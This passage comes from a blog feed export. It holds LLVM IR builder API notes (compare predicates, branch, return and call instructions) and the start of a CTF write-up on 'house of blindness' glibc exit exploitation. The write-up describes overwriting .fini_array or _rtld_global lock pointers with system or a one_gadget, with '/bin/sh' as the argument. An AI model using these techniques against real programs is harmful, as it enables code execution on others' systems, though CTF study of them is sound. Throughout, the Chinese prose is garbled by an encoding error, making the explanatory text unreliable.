class="hljs-comment">///&lt; 1 0 0 0    True if unordered: isnan(X) | isnan(Y)</span><br>  FCMP_UEQ = <span class="hljs-number">9</span>,   <span class="hljs-comment">///&lt; 1 0 0 1    True if unordered or equal</span><br>  FCMP_UGT = <span class="hljs-number">10</span>,  <span class="hljs-comment">///&lt; 1 0 1 0    True if unordered or greater than</span><br>  FCMP_UGE = <span class="hljs-number">11</span>,  <span class="hljs-comment">///&lt; 1 0 1 1    True if unordered, greater than, or equal</span><br>  FCMP_ULT = <span class="hljs-number">12</span>,  <span class="hljs-comment">///&lt; 1 1 0 0    True if unordered or less than</span><br>  FCMP_ULE = <span class="hljs-number">13</span>,  <span class="hljs-comment">///&lt; 1 1 0 1    True if unordered, less than, or equal</span><br>  FCMP_UNE = <span class="hljs-number">14</span>,  <span class="hljs-comment">///&lt; 1 1 1 0    True if unordered or not equal</span><br>  FCMP_TRUE = <span class="hljs-number">15</span>, <span class="hljs-comment">///&lt; 1 1 1 1    Always true (always folded)</span><br>  FIRST_FCMP_PREDICATE = FCMP_FALSE,<br>  LAST_FCMP_PREDICATE = FCMP_TRUE,<br>  BAD_FCMP_PREDICATE = FCMP_TRUE + <span class="hljs-number">1</span>,<br>  ICMP_EQ = <span class="hljs-number">32</span>,  <span class="hljs-comment">///&lt; equal</span><br>  ICMP_NE = <span class="hljs-number">33</span>,  <span class="hljs-comment">///&lt; not equal</span><br>  ICMP_UGT = <span class="hljs-number">34</span>, <span class="hljs-comment">///&lt; unsigned greater than</span><br>  ICMP_UGE = <span class="hljs-number">35</span>, <span class="hljs-comment">///&lt; unsigned greater or equal</span><br>  ICMP_ULT = <span class="hljs-number">36</span>, <span class="hljs-comment">///&lt; unsigned less than</span><br>  ICMP_ULE = <span class="hljs-number">37</span>, <span class="hljs-comment">///&lt; unsigned less or equal</span><br>  ICMP_SGT = <span class="hljs-number">38</span>, <span class="hljs-comment">///&lt; signed greater than</span><br>  ICMP_SGE = <span class="hljs-number">39</span>, <span class="hljs-comment">///&lt; signed greater or equal</span><br>  ICMP_SLT = <span class="hljs-number">40</span>, <span class="hljs-comment">///&lt; signed less than</span><br>  ICMP_SLE = <span class="hljs-number">41</span>, <span class="hljs-comment">///&lt; signed less or equal</span><br>  FIRST_ICMP_PREDICATE = ICMP_EQ,<br>  LAST_ICMP_PREDICATE = ICMP_SLE,<br>  BAD_ICMP_PREDICATE = ICMP_SLE + <span class="hljs-number">1</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">ICmpInst *icmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ICmpInst</span>(*entryBlock, ICmpInst::ICMP_SGT, add1, ConstantInt::<span class="hljs-built_in">get</span>(context, <span class="hljs-built_in">APInt</span>(<span class="hljs-number">32</span>, <span class="hljs-number">100</span>));<br></code></pre></td></tr></table></figure><p>éœ€è¦å¸¸æ•°å¯ä»¥åˆ›å»ºConstantInt</p><h2 id="br"><a href="#br" class="headerlink" title="br"></a>br</h2><p>BranchInstï¼Œæ— dataåŸŸ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> BranchInst *<span class="hljs-title">Create</span><span class="hljs-params">(BasicBlock *IfTrue,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(<span class="hljs-number">1</span>) <span class="hljs-built_in">BranchInst</span>(IfTrue, InsertBefore);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BranchInst *<span class="hljs-title">Create</span><span class="hljs-params">(BasicBlock *IfTrue, BasicBlock *IfFalse,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Value *Cond, Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(<span class="hljs-number">3</span>) <span class="hljs-built_in">BranchInst</span>(IfTrue, IfFalse, Cond, InsertBefore);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BranchInst *<span class="hljs-title">Create</span><span class="hljs-params">(BasicBlock *IfTrue, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(<span class="hljs-number">1</span>) <span class="hljs-built_in">BranchInst</span>(IfTrue, InsertAtEnd);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BranchInst *<span class="hljs-title">Create</span><span class="hljs-params">(BasicBlock *IfTrue, BasicBlock *IfFalse,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Value *Cond, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(<span class="hljs-number">3</span>) <span class="hljs-built_in">BranchInst</span>(IfTrue, IfFalse, Cond, InsertAtEnd);<br>&#125;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">BranchInst::<span class="hljs-built_in">Create</span>(block10,block19,icmp,entryBlock);<br></code></pre></td></tr></table></figure><h2 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h2><p>ReturnInstï¼Œæ— dataåŸŸ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">static</span> ReturnInst* <span class="hljs-title">Create</span><span class="hljs-params">(LLVMContext &amp;C, Value *retVal = <span class="hljs-literal">nullptr</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                            Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(!!retVal) <span class="hljs-built_in">ReturnInst</span>(C, retVal, InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> ReturnInst* <span class="hljs-title">Create</span><span class="hljs-params">(LLVMContext &amp;C, Value *retVal,</span></span><br><span class="hljs-params"><span class="hljs-function">                            BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(!!retVal) <span class="hljs-built_in">ReturnInst</span>(C, retVal, InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> ReturnInst* <span class="hljs-title">Create</span><span class="hljs-params">(LLVMContext &amp;C, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(<span class="hljs-number">0</span>) <span class="hljs-built_in">ReturnInst</span>(C, InsertAtEnd);<br>  &#125;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">ReturnInst::<span class="hljs-built_in">Create</span>(context, ld20, block15);<br></code></pre></td></tr></table></figure><h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><p>CallInstï¼ŒCallBaseæœ‰è‡ªå·±çš„dataåŸŸ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$<span class="hljs-number">3</span> = &#123;<br>  &lt;llvm::CallBase&gt; = &#123;<br>    &lt;llvm::Instruction&gt; = &#123;<br>      &lt;llvm::User&gt; = &#123;<br>        &lt;llvm::Value&gt; = &#123;<br>          VTy = <span class="hljs-number">0x466d80</span>,<br>          UseList = <span class="hljs-number">0x0</span>,<br>          SubclassID = <span class="hljs-number">82</span> <span class="hljs-string">&#x27;R&#x27;</span>,<br>          HasValueHandle = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassOptionalData = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassData = <span class="hljs-number">0</span>,<br>          NumUserOperands = <span class="hljs-number">3</span>,<br>          IsUsedByMD = <span class="hljs-number">0</span>,<br>          HasName = <span class="hljs-number">0</span>,<br>          HasMetadata = <span class="hljs-number">0</span>,<br>          HasHungOffUses = <span class="hljs-number">0</span>,<br>          HasDescriptor = <span class="hljs-number">0</span>,<br>          <span class="hljs-type">static</span> MaxAlignmentExponent = <span class="hljs-number">29</span>,<br>          <span class="hljs-type">static</span> MaximumAlignment = <span class="hljs-number">536870912</span><br>        &#125;, &lt;No data fields&gt;&#125;, <br>      &lt;llvm::ilist_node_with_parent&lt;llvm::Instruction, llvm::BasicBlock&gt;&gt; = &#123;<br>        &lt;llvm::ilist_node&lt;llvm::Instruction&gt;&gt; = &#123;<br>          &lt;llvm::ilist_node_impl&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-type">void</span>&gt; &gt;&gt; = &#123;<br>            &lt;llvm::ilist_node_base&lt;<span class="hljs-literal">false</span>&gt;&gt; = &#123;<br>              Prev = <span class="hljs-number">0x0</span>,<br>              Next = <span class="hljs-number">0x0</span><br>            &#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, <br>      members of llvm::Instruction:<br>      Parent = <span class="hljs-number">0x0</span>,<br>      DbgLoc = &#123;<br>        Loc = &#123;<br>          Ref = &#123;<br>            MD = <span class="hljs-number">0x0</span><br>          &#125;<br>        &#125;<br>      &#125;,<br>      Order = <span class="hljs-number">0</span><br>    &#125;, <br>    members of llvm::CallBase:<br>    <span class="hljs-type">static</span> CalledOperandOpEndIdx = <span class="hljs-number">-1</span>,<br>    Attrs = &#123;<br>      pImpl = <span class="hljs-number">0x0</span><br>    &#125;,<br>    FTy = <span class="hljs-number">0x46aed0</span><br>  &#125;, &lt;No data fields&gt;&#125;<br></code></pre></td></tr></table></figure><p>å¥½å¤šé‡è½½ï¼ˆ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *F, <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (<span class="hljs-built_in">ComputeNumOperands</span>(<span class="hljs-number">0</span>)) <span class="hljs-built_in">CallInst</span>(Ty, F, NameStr, InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (<span class="hljs-built_in">ComputeNumOperands</span>(Args.<span class="hljs-built_in">size</span>()))<br>        <span class="hljs-built_in">CallInst</span>(Ty, Func, Args, None, NameStr, InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          ArrayRef&lt;OperandBundleDef&gt; Bundles = None,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> NumOperands =<br>        <span class="hljs-built_in">ComputeNumOperands</span>(Args.<span class="hljs-built_in">size</span>(), <span class="hljs-built_in">CountBundleInputs</span>(Bundles));<br>    <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> DescriptorBytes = Bundles.<span class="hljs-built_in">size</span>() * <span class="hljs-built_in">sizeof</span>(BundleOpInfo);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (NumOperands, DescriptorBytes)<br>        <span class="hljs-built_in">CallInst</span>(Ty, Func, Args, Bundles, NameStr, InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *F, <span class="hljs-type">const</span> Twine &amp;NameStr,</span></span><br><span class="hljs-params"><span class="hljs-function">                          BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (<span class="hljs-built_in">ComputeNumOperands</span>(<span class="hljs-number">0</span>)) <span class="hljs-built_in">CallInst</span>(Ty, F, NameStr, InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (<span class="hljs-built_in">ComputeNumOperands</span>(Args.<span class="hljs-built_in">size</span>()))<br>        <span class="hljs-built_in">CallInst</span>(Ty, Func, Args, None, NameStr, InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          ArrayRef&lt;OperandBundleDef&gt; Bundles,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> NumOperands =<br>        <span class="hljs-built_in">ComputeNumOperands</span>(Args.<span class="hljs-built_in">size</span>(), <span class="hljs-built_in">CountBundleInputs</span>(Bundles));<br>    <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> DescriptorBytes = Bundles.<span class="hljs-built_in">size</span>() * <span class="hljs-built_in">sizeof</span>(BundleOpInfo);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (NumOperands, DescriptorBytes)<br>        <span class="hljs-built_in">CallInst</span>(Ty, Func, Args, Bundles, NameStr, InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), NameStr,<br>                  InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          ArrayRef&lt;OperandBundleDef&gt; Bundles = None,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), Args, Bundles,<br>                  NameStr, InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), Args, NameStr,<br>                  InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, <span class="hljs-type">const</span> Twine &amp;NameStr,</span></span><br><span class="hljs-params"><span class="hljs-function">                          BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), NameStr,<br>                  InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), Args, NameStr,<br>                  InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          ArrayRef&lt;OperandBundleDef&gt; Bundles,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), Args, Bundles,<br>                  NameStr, InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(CallInst *CI, ArrayRef&lt;OperandBundleDef&gt; Bundles,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertPt = <span class="hljs-literal">nullptr</span>)</span></span>;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">CreateWithReplacedBundle</span><span class="hljs-params">(CallInst *CI,</span></span><br><span class="hljs-params"><span class="hljs-function">                                            OperandBundleDef Bundle,</span></span><br><span class="hljs-params"><span class="hljs-function">                                            Instruction *InsertPt = <span class="hljs-literal">nullptr</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Function* myAddFunc = <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getFunction</span>(<span class="hljs-string">&quot;myadd&quot;</span>);<br>Value *arg[] = &#123;old_ope-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">0</span>), old_ope-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">1</span>)&#125;;<br>CallInst *myaddCall = CallInst::<span class="hljs-built_in">Create</span>(myAddFunc, arg, <span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LLVM</category>
      
      <category>IR</category>
      
    </categories>
    
    
    <tags>
      
      <tag>llvm</tag>
      
      <tag>ir</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of blindness</title>
    <link href="/2023/08/23/house-of-blindness/"/>
    <url>/2023/08/23/house-of-blindness/</url>
    
    <content type="html"><![CDATA[<p>pwnæ‰‹åå¤§ç‰¢çš„wm&#x2F;(ã„’oã„’)&#x2F;~~ä¹–ä¹–æ¥å¤ç°äº†ï¼Œè¿™é¢˜æ¯”èµ›çš„æ—¶å€™äºŒåå‡ è§£æ­»æ´»åšä¸å‡ºæ¥å°±å¾ˆéš¾å—</p><p>psï¼šçœŸçš„æ˜¯houseå¤ªå¤šäº†ä¹°ä¸èµ·â€¦â€¦</p><span id="more"></span><h1 id="å…¶ä»–çš„exitåˆ©ç”¨æ–¹æ³•"><a href="#å…¶ä»–çš„exitåˆ©ç”¨æ–¹æ³•" class="headerlink" title="å…¶ä»–çš„exitåˆ©ç”¨æ–¹æ³•"></a>å…¶ä»–çš„exitåˆ©ç”¨æ–¹æ³•</h1><h2 id="æ›´æ”¹-fini-array"><a href="#æ›´æ”¹-fini-array" class="headerlink" title="æ›´æ”¹.fini_array"></a>æ›´æ”¹.fini_array</h2><p>elfæ–‡ä»¶ä¸­ä¼šå­˜åœ¨ä¸€ä¸ª.fini_arrayæ®µ</p><img src="/2023/08/23/house-of-blindness/fini.png" class title="fini"><p>åœ¨exitçš„æ—¶å€™ä¼šè°ƒç”¨__do_global_dtors_aux_fini_array_entryæŒ‡å‘çš„å‡½æ•°__do_global_dtors_aux</p><p>æ‰€ä»¥å¯ä»¥æ›´æ”¹__do_global_dtors_aux_fini_array_entryçš„å†…å®¹ä¸ºsystem(â€˜&#x2F;bin&#x2F;shâ€™)ï¼Œä¹‹å‰è§è¿‡ä¸€é“ç”¨è¿™ç§æ–¹æ³•è¿›è¡Œå¾ªç¯æ‰§è¡Œçš„é¢˜ï¼ˆä½†åªèƒ½å¾ªç¯ä¸€æ¬¡ï¼‰</p><h2 id="rtld-lock-unlock-recursiveåŠ«æŒ"><a href="#rtld-lock-unlock-recursiveåŠ«æŒ" class="headerlink" title="__rtld_lock_unlock_recursiveåŠ«æŒ"></a>__rtld_lock_unlock_recursiveåŠ«æŒ</h2><p>exitçš„æ—¶å€™å­˜åœ¨è°ƒç”¨æµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">exit</span>-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;_rtld_global._dl_rtld_lock_recursive<br>-&gt;_rtld_global._dl_rtld_unlock_recursive<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥æ›´æ”¹_rtld_globalçš„_dl_rtld_unlock_recursiveæˆå‘˜æˆ–è€…_dl_rtld_lock_recursiveæˆå‘˜ä¸ºsystemåœ°å€æˆ–è€…one_gadgetåœ°å€</p><p>è°ƒç”¨_rtld_global._dl_rtld_lock_recursiveæ—¶çš„å‚æ•°rdiæ˜¯_rtld_global._dl_load_lock.mutexï¼Œå¯ä»¥æ”¹ä¸º&#x2F;bin&#x2F;sh</p><img src="/2023/08/23/house-of-blindness/mutex.png" class title="mutex"><p>è¿™é“é¢˜ä¹Ÿå¯ä»¥æ›´æ”¹_rtld_globalï¼Œä½†ldä¸­çš„_rtld_globalå’Œlibcä¸­çš„systemè·ç¦»å¤ªè¿œï¼Œå­˜åœ¨ä¸€ä¸ª4096çš„çˆ†ç ´ï¼Œè¿™æ¦‚ç‡å¯¹äºæˆ‘è¿™ç§éé…‹æ¥è¯´ç­‰äº0(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»</p><h1 id="house-of-blindness"><a href="#house-of-blindness" class="headerlink" title="house of blindness"></a>house of blindness</h1><p>å…ˆè®©æˆ‘ä»¬æ¥æ¢ç©¶ä¸€ä¸‹exitçš„æµç¨‹ï¼Œæ¯”å¦‚å®ƒåˆ°åº•æ˜¯æ€ä¹ˆè°ƒç”¨.fini_arrayçš„</p><h2 id="exitè°ƒç”¨-fini-arrayæµç¨‹"><a href="#exitè°ƒç”¨-fini-arrayæµç¨‹" class="headerlink" title="exitè°ƒç”¨.fini_arrayæµç¨‹"></a>exitè°ƒç”¨.fini_arrayæµç¨‹</h2><ul><li><p>exitå‡½æ•°ç›´æ¥è°ƒç”¨__run_exit_handlers</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">exit</span> <span class="hljs-params">(<span class="hljs-type">int</span> status)</span><br>&#123;<br>  __run_exit_handlers (status, &amp;__exit_funcs, <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);<br>&#125;<br>libc_hidden_def (<span class="hljs-built_in">exit</span>)<br></code></pre></td></tr></table></figure></li><li><p>exitä¼ ç»™__run_exit_handlersçš„__exit_funcsæŒ‡å‘initial</p><img src="/2023/08/23/house-of-blindness/handlers.png" class title="handlers"><img src="/2023/08/23/house-of-blindness/initial.png" class 